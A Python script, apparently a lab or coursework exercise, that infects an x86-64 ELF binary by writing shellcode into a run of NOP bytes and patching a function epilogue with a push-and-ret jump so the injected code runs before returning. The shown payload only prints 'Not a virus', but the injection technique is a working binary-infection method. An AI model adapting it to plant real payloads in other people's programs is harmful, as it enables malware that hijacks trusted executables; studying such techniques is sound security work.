import sys

with open(sys.argv[1], "rb") as f:
    bin_data = bytearray(f.read())

debug = False

""" ------ 1. identify epilogue location and epilogue ------ """
def findTextSection(bin_data):
    entry_bytes = bin_data[0x18:0x1c] # entry point as revealed by elf header at [0x18, 0x1b]
    text_addr = 0
    for byte in entry_bytes[1:3]:
        text_addr = (text_addr << 8) | byte
    return text_addr

def isFullCommand(cmd):
    # 1. nop
    if len(cmd) == 1 and cmd[0] == 0x90:
        return True
    # 2. add pattern 48 83 C4 xx
    if len(cmd) == 4 and cmd[0] == 0x48 and cmd[1] == 0x83 and cmd[2] == 0xC4:
        return True
    # 3. add pattern 48 81 C4 xx xx xx xx
    if len(cmd) == 7 and cmd[0] == 0x48 and cmd[1] == 0x81 and cmd[2] == 0xC4:
        return True
    # 4. mov pattern B8 xx xx xx xx
    if len(cmd) == 5 and cmd[0] == 0xB8:
        return True
    # 5. pop 
    if len(cmd) == 1 and 0x58 <= cmd[0] <= 0x5F:
        return True
    # 6. pop rXX 
    if len(cmd) == 2 and cmd[0] == 0x41 and 0x58 <= cmd[1] <= 0x5F:
        return True

    return False
def attemptEpilogue(currAddr, bin_data):
    epilogue = []
    cache = [bin_data[currAddr]]

    while len(epilogue) < 9:
        currAddr -= 1
        cache.append(bin_data[currAddr])
        if isFullCommand(cache[::-1]):
            epilogue.extend(cache)
            currAddr -= 1
            cache = [bin_data[currAddr]]
        if len(cache) > 7: # max length of command is 7 bytes
            return False # failed attempt
    return epilogue[::-1]
def attemptToFindRet(bin_data, text_addr):
    currAddr = text_addr
    result = False
    endOfFile = len(bin_data)
    while currAddr < endOfFile:
        while currAddr < endOfFile and bin_data[currAddr] != 0xC3:
            currAddr += 1
        if currAddr >= endOfFile:
            break
        
        if debug: print(hex(bin_data[currAddr]))
        result = attemptEpilogue(currAddr-1, bin_data)

        if result is False:
            currAddr += 1
            continue

        break

    if currAddr >= endOfFile or result is False:
        print("Unable to find a suitable ret")
        sys.exit(1)
    else:
        return {
            "epilogue": result,
            "location": currAddr
        }

""" ------ 2. find NOP function ------ """
def findSuitableNopAddress(bin_data, start_addr, payloadSize):
    currAddr = start_addr
    currNopLength = 0
    while (currAddr < len(bin_data) - 1):
        currByte = bin_data[currAddr]
        if currByte == 0x90: 
            currNopLength += 1
        else:
            currNopLength = 0
        if currNopLength == payloadSize:
            break
        currAddr += 1
    # assume that there will always be a nop function large enough
    return currAddr - payloadSize + 0x02

""" ------ 2. inject payload ------ """
def writePayloadAtNops(bin_data, write_loc, epilogue, payload):
    toInject = bytes(payload) + bytes(epilogue) + bytes([0xC3])

    bin_data[write_loc:write_loc+len(toInject)] = toInject
def writeTrickyJump(bin_data, ret_loc, epilogue_len, jumpTo):
    patch = [
        0x68,
        (jumpTo >> 0) & 0xFF,
        (jumpTo >> 8) & 0xFF,
        (jumpTo >> 16) & 0xFF,
        (jumpTo >> 24) & 0xFF,
    ]
    patch += [0x90] * (epilogue_len - len(patch)) # nop padding
    bin_data[ret_loc - epilogue_len: ret_loc] = bytes(patch)


""" EXECUTE!!!! """
payload = [
    0xeb, 0x0c,                # jmp short <skip_string>
    0x4e, 0x6f, 0x74, 0x20, 0x61, 0x20, 0x76, 0x69, 0x72, 0x75, 0x73, 0x0a,     # "Not a virus\n"
    0xb8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1        ; syscall number for write
    0xbf, 0x01, 0x00, 0x00, 0x00,  # mov edi, 1        ; file descriptor = stdout
    0x48, 0x8d, 0x35, 0xe3, 0xff, 0xff, 0xff,  # lea rsi, [rip-0x1d] ; address of string
    0xba, 0x0c, 0x00, 0x00, 0x00,  # mov edx, 0xc      ; length = 12 bytes
    0x0f, 0x05                 # syscall             ; invoke write(stdout, msg, len)
]

text_addr = findTextSection(bin_data)
epilogue_info = attemptToFindRet(bin_data, text_addr)
epilogue = epilogue_info["epilogue"]
if debug: print([hex(b) for b in epilogue])
ret_loc = epilogue_info["location"]
nop_loc = findSuitableNopAddress(bin_data, text_addr, len(payload))


writePayloadAtNops(bin_data, nop_loc, epilogue, payload)
writeTrickyJump(bin_data, ret_loc, len(epilogue), nop_loc)


with open(sys.argv[1] + "mod", "wb") as f:
    f.write(bin_data)